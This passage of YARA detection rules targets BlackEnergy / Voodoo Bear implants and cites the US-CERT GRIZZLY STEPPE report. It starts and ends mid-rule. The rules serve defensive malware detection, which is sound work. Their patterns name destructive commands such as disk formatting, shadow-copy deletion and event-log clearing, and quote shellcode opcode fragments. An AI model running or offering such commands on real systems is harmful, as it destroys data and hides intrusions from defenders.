6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00
00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00
6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 46
00 0F 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00
69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 55 00 53 00 42 00 20
00 4D 00 44 00 4D 00 20 00 44 00 72 00 69 00 76 00 65 00 72 00 00 00
00 00 3C 00 0E 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73
00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00
30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 4A 00 13 00 01 00 4C
00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00
68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74
00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 31 00 33 00 00 00 00 00
3E 00 0B 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46
00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73 00 62 00
6D 00 64 00 6D 00 2E 00 73 00 79 00 73 00 00 00 00 00 66 00 23 00 01
00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00
00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20
00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00
72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65
00 6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00
63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E
00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00
00 00 1C 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34 00 62 00 30
00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00
4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73
00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00
74 00 69 00 6F 00 6E 00 00 00 46 00 0F 00 01 00 46 00 69 00 6C 00 65
00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00
00 00 00 00 55 00 53 00 42 00 20 00 4D 00 44 00 4D 00 20 00 44 00 72
00 69 00 76 00 65 00 72 00 00 00 00 00 3C 00 0E 00 01 00 46 00 69 00
6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35
00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00
32 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F
00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00
79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32
00 30 00 31 00 33 00 00 00 00 00 3E 00 0B 00 01 00 4F 00 72 00 69 00
67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D
00 65 00 00 00 75 00 73 00 62 00 6D 00 64 00 6D 00 2E 00 73 00 79 00
73 00 00 00 00 00 66 00 23 00 01 00 50 00 72 00 6F 00 64 00 75 00 63
00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00
6F 00 73 00 6F 00 66 00 74 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77
00 73 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00
20 00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01
00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00
69 00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30
00 2E 00 35 00 35 00 31 00 32 00 00 00 48 00 00 00 01 00 56 00 61 00
72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 28
00 08 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00
6F 00 6E 00 00 00 00 00 15 00 B0 04 09 04 B0 04}
$b2 = {34 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 03 00 03 00 04 00 02 00 03 00 03 00 04 00 02 00 3F 00 00 00
00 00 00 00 04 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 94 02 00 00 00 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 70 02 00 00 00 00 30 00 34
00 30 00 39 00 30 00 34 00 65 00 34 00 00 00 4A 00 15 00 01 00 43 00
6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00
00 53 00 6F 00 6C 00 69 00 64 00 20 00 53 00 74 00 61 00 74 00 65 00
20 00 4E 00 65 00 74 00 77 00 6F 00 72 00 6B 00 73 00 00 00 00 00 62
00 1D 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00
69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 41 00 64 00 6F 00 62
00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00 6C 00 61 00
79 00 65 00 72 00 20 00 49 00 6E 00 73 00 74 00 61 00 6C 00 6C 00 65
00 72 00 00 00 00 00 30 00 08 00 01 00 46 00 69 00 6C 00 65 00 56 00
65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 33 00 2E 00 33 00 2E
00 32 00 2E 00 34 00 00 00 32 00 09 00 01 00 49 00 6E 00 74 00 65 00
72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 68 00 6F 00 73
00 74 00 2E 00 65 00 78 00 65 00 00 00 00 00 76 00 29 00 01 00 4C 00
65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68
00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00
20 00 28 00 43 00 29 00 20 00 41 00 64 00 6F 00 62 00 65 00 20 00 53
00 79 00 73 00 74 00 65 00 6D 00 73 00 20 00 49 00 6E 00 63 00 6F 00
72 00 70 00 6F 00 72 00 61 00 74 00 65 00 64 00 00 00 00 00 3A 00 09
00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00
6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 68 00 6F 00 73 00 74 00 2E
00 65 00 78 00 65 00 00 00 00 00 5A 00 1D 00 01 00 50 00 72 00 6F 00
64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 41 00 64
00 6F 00 62 00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00
6C 00 61 00 79 00 65 00 72 00 20 00 49 00 6E 00 73 00 74 00 61 00 6C
00 6C 00 65 00 72 00 00 00 00 00 34 00 08 00 01 00 50 00 72 00 6F 00
64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00
00 33 00 2E 00 33 00 2E 00 32 00 2E 00 34 00 00 00 44 00 00 00 00 00
56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00
00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00
74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04 46 45 32 58}
$b3 = {C8 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00
00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 28 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 04 02 00 00 01 00 30 00 34
00 30 00 39 00 30 00 34 00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00
6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00
00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00
6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 48
00 10 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00
69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 49 00 44 00 45 00 20
00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69 00 76 00 65 00 72 00
00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73
00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00
30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00 28 00 78 00 70 00 73
00 70 00 2E 00 30 00 38 00 30 00 34 00 31 00 33 00 2D 00 30 00 38 00
35 00 32 00 29 00 00 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67 00 61
00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00
43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43
00 29 00 20 00 32 00 30 00 30 00 39 00 00 00 00 00 66 00 23 00 01 00
50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00
00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00
57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00 72
00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65 00
6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00 63
00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E 00
31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00
00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00
6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E
00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04 }
$b4 = {9C 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 01 00 06 00 01 40 B0 1D 01 00 06 00 01 40 B0 1D 3F 00 00 00
00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 FA 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 D6 02 00 00 01 00 30 00 34
00 30 00 39 00 30 00 34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00
6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00
00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00
6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 58
00 18 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00
69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 52 00 65 00 67 00 69
00 73 00 74 00 72 00 79 00 20 00 45 00 64 00 69 00 74 00 6F 00 72 00
20 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 00 00 6C 00 26 00 01
00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00
00 00 00 00 36 00 2E 00 31 00 2E 00 37 00 36 00 30 00 30 00 2E 00 31
00 36 00 33 00 38 00 35 00 20 00 28 00 77 00 69 00 6E 00 37 00 5F 00
72 00 74 00 6D 00 2E 00 30 00 39 00 30 00 37 00 31 00 33 00 2D 00 31
00 32 00 35 00 35 00 29 00 00 00 3A 00 0D 00 01 00 49 00 6E 00 74 00
65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 72 00 65
00 67 00 65 00 64 00 74 00 33 00 32 00 2E 00 65 00 78 00 65 00 00 00
00 00 80 00 2E 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70
00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9 00 20 00 4D 00 69 00
63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70
00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20 00 41 00 6C 00
6C 00 20 00 72 00 69 00 67 00 68 00 74 00 73 00 20 00 72 00 65 00 73
00 65 00 72 00 76 00 65 00 64 00 2E 00 00 00 42 00 0D 00 01 00 4F 00
72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E
00 61 00 6D 00 65 00 00 00 72 00 65 00 67 00 65 00 64 00 74 00 33 00
32 00 2E 00 65 00 78 00 65 00 00 00 00 00 6A 00 25 00 01 00 50 00 72
00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00
4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 AE 00 20 00 57
00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 20 00 4F 00 70 00 65 00
72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65
00 6D 00 00 00 00 00 42 00 0F 00 01 00 50 00 72 00 6F 00 64 00 75 00
63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 36 00 2E
00 31 00 2E 00 37 00 36 00 30 00 30 00 2E 00 31 00 36 00 33 00 38 00
35 00 00 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C
00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00
72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00
00 09 04 B0 04}
$b5 = {78 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 00 00 05 00 6A 44 B1 1D 00 00 05 00 6A 44 B1 1D 3F 00 00 00
00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 D6 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 B2 02 00 00 01 00 30 00 34
00 30 00 39 00 30 00 34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00
6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00
00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00
6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 4E
00 13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00
69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 57 00 69 00 6E 00 64
00 6F 00 77 00 73 00 AE 00 53 00 79 00 73 00 55 00 74 00 69 00 6C 00
69 00 74 00 79 00 00 00 00 00 72 00 29 00 01 00 46 00 69 00 6C 00 65
00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00
30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34
00 20 00 28 00 77 00 69 00 6E 00 37 00 73 00 70 00 31 00 5F 00 72 00
74 00 6D 00 2E 00 31 00 30 00 31 00 31 00 31 00 39 00 2D 00 31 00 38
00 35 00 30 00 29 00 00 00 00 00 30 00 08 00 01 00 49 00 6E 00 74 00
65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 6D 00 73
00 69 00 65 00 78 00 65 00 63 00 00 00 80 00 2E 00 01 00 4C 00 65 00
67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74
00 00 00 A9 00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00
74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F
00 6E 00 2E 00 20 00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68 00
74 00 73 00 20 00 72 00 65 00 73 00 65 00 72 00 76 00 65 00 64 00 2E
00 00 00 40 00 0C 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00
6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 6D 00 73
00 69 00 65 00 78 00 65 00 63 00 2E 00 65 00 78 00 65 00 00 00 58 00
1C 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D
00 65 00 00 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 53 00
79 00 73 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 20 00 2D 00 20
00 55 00 6E 00 69 00 63 00 6F 00 64 00 65 00 00 00 42 00 0F 00 01 00
50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69
00 6F 00 6E 00 00 00 35 00 2E 00 30 00 2E 00 37 00 36 00 30 00 31 00
2E 00 31 00 37 00 35 00 31 00 34 00 00 00 00 00 44 00 00 00 01 00 56
00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00
00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74
00 69 00 6F 00 6E 00 00 00 00 00 09 04 B0 04}
$b6 = {D4 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00
00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 34 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
00 65 00 49 00 6E 00 66 00 6F 00 00 00 10 02 00 00 01 00 30 00 34 00
30 00 39 00 30 00 34 00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00 6F
00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00 00
4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F
00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 4E 00
13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69
00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 53 00 65 00 72 00 69 00
61 00 6C 00 20 00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69 00 76
00 65 00 72 00 00 00 00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00
56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31
00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00
28 00 78 00 70 00 73 00 70 00 2E 00 30 00 38 00 30 00 34 00 31 00 33
00 2D 00 30 00 38 00 35 00 32 00 29 00 00 00 00 00 4A 00 13 00 01 00
4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67
00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00
74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 30 00 34 00 00 00 00
00 6A 00 25 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00
61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F
00 66 00 74 00 AE 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00
AE 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20
00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01 00
50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69
00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00
2E 00 35 00 35 00 31 00 32 00 00 00 44 00 00 00 01 00 56 00 61 00 72
00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00
04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F
00 6E 00 00 00 00 00 09 04 E4 04}
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and
(((any of ($a*)) and (uint32(uint32(0x3C)+8) == 0x00000000)) or
(for any of ($b*): ($ in (uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+20))..(uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+20))+uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+16)))))))
}
rule SSC_IMPLANT_4_v3_AlternativeRule {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
comment = "Alternative rule - not based on the original samples but samples on which the original rule matched"
author = "Florian Roth"
reference = "US CERT Grizzly Steppe Report"
date = "2017-02-12"
hash1 = "2244fe9c5d038edcb5406b45361613cf3909c491e47debef35329060b00c985a"
strings:
$op1 = { 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 53 1e 01 00 } /* Opcode */
$op2 = { 21 da 40 00 00 a0 40 00 08 a0 40 00 b0 70 40 00 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and all of them )
}
rule SSC_IMPLANT_4_v4 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$DK_format1 = "/c format %c: /Y /Q" ascii
$DK_format2 = "/c format %c: /Y /X /FS:NTFS" ascii
$DK_physicaldrive = "PhysicalDrive%d" wide
$DK_shutdown = "shutdown /r /t %d"
condition:
uint16(0) == 0x5A4D and all of ($DK*)
}
rule SSC_IMPLANT_4_v5 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$GEN_HASH = {0F BE C9 C1 C0 07 33 C1}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or
uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or
uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_4_v6 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = "DispatchCommand" wide ascii
$STR2 = "DispatchEvent" wide ascii
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_4_v7 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$sb1 = {C7 [1-5] 33 32 2E 64 C7 [1-5] 77 73 32 5F 66 C7 [1-5] 6C 6C}
$sb2 = {C7 [1-5] 75 73 65 72 C7 [1-5] 33 32 2E 64 66 C7 [1-5] 6C 6C}
$sb3 = {C7 [1-5] 61 64 76 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}
$sb4 = {C7 [1-5] 77 69 6E 69 C7 [1-5] 6E 65 74 2E C7 [1-5] 64 6C 6C}
$sb5 = {C7 [1-5] 73 68 65 6C C7 [1-5] 6C 33 32 2E C7 [1-5] 64 6C 6C}
$sb6 = {C7 [1-5] 70 73 61 70 C7 [1-5] 69 2E 64 6C 66 C7 [1-5] 6C}
$sb7 = {C7 [1-5] 6E 65 74 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}
$sb8 = {C7 [1-5] 76 65 72 73 C7 [1-5] 69 6F 6E 2E C7 [1-5] 64 6C 6C}
$sb9 = {C7 [1-5] 6F 6C 65 61 C7 [1-5] 75 74 33 32 C7 [1-5] 2E 64 6C 6C}
$sb10 = {C7 [1-5] 69 6D 61 67 C7 [1-5] 65 68 6C 70 C7 [1-5] 2E 64 6C 6C}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 3 of them
}
rule SSC_IMPLANT_4_v8 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$f1 = {5E 81 EC 04 01 00 00 8B D4 68 04 01 00 00 52 6A 00 FF 57 1C 8B D4
33 C9 03 D0 4A 41 3B C8 74 05 80 3A 5C 75 F5 42 81 EC 04 01 00 00 8B
DC 52 51 53 68 04 01 00 00 FF 57 20 59 5A 66 C7 04 03 5C 20 56 57 8D
3C 03 8B F2 F3 A4 C6 07 00 5F 5E 33 C0 50 68 80 00 00 00 6A 02 50 50
68 00 00 00 40 53 FF 57 14 53 8B 4F 4C 8B D6 33 DB 30 1A 42 43 3B D9
7C F8 5B 83 EC 04 8B D4 50 6A 00 52 FF 77 4C 8B D6 52 50 FF 57 24 FF
57 18}
$f2 = {5E 83 EC 1C 8B 45 08 8B 4D 08 03 48 3C 89 4D E4 89 75 EC 8B 45 08
2B 45 10 89 45 E8 33 C0 89 45 F4 8B 55 0C 3B 55 F4 0F 86 98 00 00 00
8B 45 EC 8B 4D F4 03 48 04 89 4D F4 8B 55 EC 8B 42 04 83 E8 08 D1 E8
89 45 F8 8B 4D EC 83 C1 08 89 4D FC}
$f3 = {5F 8B DF 83 C3 60 2B 5F 54 89 5C 24 20 8B 44 24 24 25 00 00 FF FF
66 8B 18 66 81 FB 4D 5A 74 07 2D 00 00 01 00 EB EF 8B 48 3C 03 C8 66
8B 19 66 81 FB 50 45 75 E0 8B E8 8B F7 83 EC 60 8B FC B9 60 00 00 00
F3 A4 83 EF 60 6A 0D 59 E8 88 00 00 00 E2 F9 68 6C 33 32 00 68 73 68
65 6C 54 FF 57}
$a1 = {83 EC 04 60 E9 1E 01 00 00}
condition:
$a1 at pe.entry_point or any of ($f*)
}
rule SSC_IMPLANT_4_v9 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$a = "wevtutil clear-log" ascii wide nocase
$b = "vssadmin delete shadows" ascii wide nocase
$c = "AGlobal\\23d1a259-88fa-41df-935f-cae523bab8e6" ascii wide nocase
$d = "Global\\07fd3ab3-0724-4cfd-8cc2-60c0e450bb9a" ascii wide nocase //$e = {57 55 33 c9 51 8b c3 99 57 52 50}
$openPhysicalDiskOverwriteWithZeros = { 57 55 33 C9 51 8B C3 99 57 52
50 E8 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 83 C4 10 84 C0 75 21 33 C0 89
44 24 10 89 44 24 14 6A 01 8B C7 99 8D 4C 24 14 51 52 50 56 FF 15 ??
?? ?? ?? 85 C0 74 0B 83 C3 01 81 FB 00 01 00 00 7C B6 }
$f = {83 c4 0c 53 53 6a 03 53 6a 03 68 00 00 00 c0}
condition:
($a and $b) or $c or $d or ($openPhysicalDiskOverwriteWithZeros and $f)
}
rule SSC_IMPLANT_4_v10 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$ ={A1B05C72}
$ ={EB3D0384}
$ ={6F45594E}
$ ={71815A4E}
$ ={D5B03E72}
$ ={6B43594E}
$ ={F572993D}
$ ={665D9DC0}
